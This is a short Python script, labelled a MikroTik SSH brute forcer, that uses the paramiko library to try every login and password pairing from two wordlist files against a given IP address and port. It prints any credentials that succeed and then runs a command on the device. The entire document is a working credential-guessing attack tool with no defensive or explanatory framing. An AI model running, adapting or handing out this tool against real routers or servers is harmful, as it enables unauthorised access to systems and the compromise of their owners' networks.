#MikroTik ssh brute forcer
import sys, paramiko

command = "quit"

if len(sys.argv) < 5:
    print('''\nToo few arguments. Usage: brutsshmt.py <ip> <port> <logins_file> <passwords_file>''')
    exit()
logins = open(sys.argv[3], "r")

while True:
    login_line = logins.readline()
    if login_line == '':
        break
    login_line = login_line.strip('\n')
    passwords = open(sys.argv[4], "r")
    while True:
        password_line = passwords.readline()
        password_line = password_line.strip('\n')
        if password_line == '':
            break
        print("Trying: ", login_line, password_line, "\n")
        try:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(str(sys.argv[1]), str(sys.argv[2]), username=login_line, password=password_line, timeout=5)
            print("Successful login: ", login_line, password_line, "\n")
            stdin, stdout, stderr = client.exec_command(command)
            #print("Response: ", stdout.read())
            client.close()
            exit(1)
        except paramiko.ssh_exception.BadHostKeyException as ssherr:
            print (ssherr)
        except paramiko.ssh_exception.AuthenticationException as ssherr:
            print (ssherr)
        except paramiko.ssh_exception.SSHException as ssherr:
            print (ssherr)
        except paramiko.ssh_exception.socket.error as ssherr:
            print (ssherr)
        
        finally:
            client.close()
print ("done")
